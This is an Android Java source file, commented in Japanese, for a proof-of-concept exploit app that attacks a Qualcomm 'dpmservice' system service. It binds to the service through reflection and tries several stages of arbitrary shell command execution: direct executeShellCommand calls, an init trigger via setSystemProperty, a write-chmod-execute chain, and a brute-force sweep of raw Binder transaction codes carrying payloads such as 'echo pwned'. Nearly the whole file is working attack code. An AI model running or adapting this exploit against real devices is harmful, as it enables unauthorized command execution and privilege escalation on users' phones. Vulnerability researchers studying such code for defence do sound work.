package com.example.dpmpoc;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.qti.dpm.IDpmService; // ⚠️ AIDLから自動生成されるスタブクラス

import java.lang.reflect.Method;

public class MainActivity extends Activity {

    private static final String TAG = "DpmPoc";
    private static final String TARGET_SERVICE = "dpmservice";
    private TextView tvResult;
    private Button btnExploit;

    // ★ ここが正しいAIDLバインディングオブジェクト
    private IDpmService mDpmService = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvResult = findViewById(R.id.tvResult);
        btnExploit = findViewById(R.id.btnExploit);

        btnExploit.setOnClickListener(v -> new Thread(this::executeMultiStageExploit).start());
    }

    // ================================================================
    // 【最重要】ServiceManager から IBinder を取得し、AIDLスタブに変換
    // ================================================================
    private boolean bindToDpmService() {
        try {
            // 1. ServiceManager をリフレクションで呼び出し
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            IBinder binder = (IBinder) getService.invoke(null, TARGET_SERVICE);

            if (binder == null) {
                showResult("❌ ServiceManager: " + TARGET_SERVICE + " が見つかりません");
                return false;
            }

            // 2. ★ ここが「正しいクラスバインディング」！
            //    AIDLで定義したインターフェースにキャスト（Stub.asInterface）
            mDpmService = IDpmService.Stub.asInterface(binder);
            showResult("✅ AIDLスタブへのバインド成功！ メソッド呼び出し準備完了");
            return true;

        } catch (Exception e) {
            Log.e(TAG, "AIDLバインド失敗", e);
            showResult("❌ AIDLバインド例外: " + e.getMessage());
            return false;
        }
    }

    // ================================================================
    // 多層攻撃エントリポイント
    // ================================================================
    private void executeMultiStageExploit() {
        // まずは正規AIDLバインドを試みる
        if (!bindToDpmService()) {
            showResult("⚠️ AIDLバインド不可 → 生Binderトランザクション総当たりに移行");
            bruteForceFallback();
            return;
        }

        // ---- 第1層: AIDLスタブ経由で正規メソッドを呼び出す ----
        if (tryAidlDirectExec()) {
            showResult("🎯 第1層成功: AIDLスタブ経由で exec を実行しました");
            return;
        }

        // ---- 第2層: AIDLスタブの他のメソッドを試す（プロパティ/ファイル） ----
        if (tryAidlPropertyTrigger()) {
            showResult("🎯 第2層成功: setSystemProperty 経由で init トリガー");
            return;
        }
        if (tryAidlFileChain()) {
            showResult("🎯 第2層成功: writeFile + setFilePermissions 連鎖");
            return;
        }

        // ---- 第3層: スタブはあるがメソッドが実装されていない場合 → 生トランザクション総当たり ----
        showResult("⚠️ AIDLメソッドが未実装の可能性 → 総当たりモードへ");
        bruteForceFallback();
    }

    // ================================================================
    // 層1: AIDLスタブを使ったダイレクト実行（正攻法）
    // ================================================================
    private boolean tryAidlDirectExec() {
        if (mDpmService == null) return false;
        try {
            String cmd = "id > /data/local/tmp/aidl_direct.txt 2>&1 && echo 'uid='$(id -u) >> /data/local/tmp/aidl_direct.txt";
            mDpmService.executeShellCommand(cmd);
            showResult("  [AIDL] executeShellCommand 呼び出し成功（例外なし）");
            return true;
        } catch (RemoteException e) {
            Log.w(TAG, "AIDL exec失敗", e);
            return false;
        }
    }

    // ================================================================
    // 層2-A: AIDLスタブ → setSystemProperty (ctl.start)
    // ================================================================
    private boolean tryAidlPropertyTrigger() {
        if (mDpmService == null) return false;
        try {
            // ctl.start で定義済みのデバッグサービスを起動（事前に .rc に書いておく）
            mDpmService.setSystemProperty("ctl.start", "exec_dpm_poc");
            showResult("  [AIDL] setSystemProperty(ctl.start) 発行");
            return true;
        } catch (RemoteException e) {
            Log.w(TAG, "AIDL property失敗", e);
            return false;
        }
    }

    // ================================================================
    // 層2-B: AIDLスタブ → writeFile + chmod (連鎖)
    // ================================================================
    private boolean tryAidlFileChain() {
        if (mDpmService == null) return false;
        String path = "/data/local/tmp/aidl_script.sh";
        String content = "#!/system/bin/sh\nid > /data/local/tmp/aidl_file_result.txt\n";
        try {
            mDpmService.writeFile(path, content.getBytes("UTF-8"));
            mDpmService.setFilePermissions(path, 0755);
            // 最後に executeShellCommand で起動
            mDpmService.executeShellCommand("/system/bin/sh " + path);
            showResult("  [AIDL] ファイル書き込み + chmod + 実行チェーン成功");
            return true;
        } catch (Exception e) {
            Log.w(TAG, "AIDL file chain失敗", e);
            return false;
        }
    }

    // ================================================================
    // 層3: 生Binderトランザクション総当たり（フォールバック）
    // ================================================================
    private void bruteForceFallback() {
        IBinder binder = getRawBinder();
        if (binder == null) {
            showResult("❌ 生Binder取得にも失敗しました");
            return;
        }

        String[] testPayloads = {
            "id > /data/local/tmp/brute1.txt",
            "touch /data/local/tmp/brute2.txt",
            "echo pwned > /data/local/tmp/brute3.txt"
        };

        for (int code = 1; code <= 25; code++) {
            for (String payload : testPayloads) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken("com.qti.dpm.IDpmService");
                    // パラメータパターンを可変にして幅広く探索
                    if (code % 3 == 0) data.writeString(payload);
                    else if (code % 3 == 1) { data.writeString("dummy"); data.writeString(payload); }
                    else { data.writeString("/data/local/tmp/dummy.sh"); data.writeInt(0755); }

                    boolean ret = binder.transact(code, data, reply, 0);
                    reply.readException(); // 例外が飛ばなければ権限チェックなしの可能性が高い
                    showResult("  [Brute] Code " + code + " 応答OK (ret=" + ret + "), ペイロード送信済み");
                    // 成功したら抜ける（複数ヒットする可能性もあるが、1つ見つかれば十分）
                    return;
                } catch (Exception e) {
                    // セキュリティ例外は無視して次へ
                    Log.v(TAG, "Code " + code + " 失敗: " + e.getMessage());
                } finally {
                    data.recycle();
                    reply.recycle();
                }
            }
        }
        showResult("❌ 総当たり失敗: 実行可能なトランザクションコードが見つかりませんでした");
    }

    // フォールバック用：生IBinderを再取得
    private IBinder getRawBinder() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            return (IBinder) getService.invoke(null, TARGET_SERVICE);
        } catch (Exception e) {
            return null;
        }
    }

    // UI表示ヘルパー
    private void showResult(final String msg) {
        runOnUiThread(() -> {
            tvResult.append(msg + "\n");
            Log.d(TAG, msg);
        });
    }
}
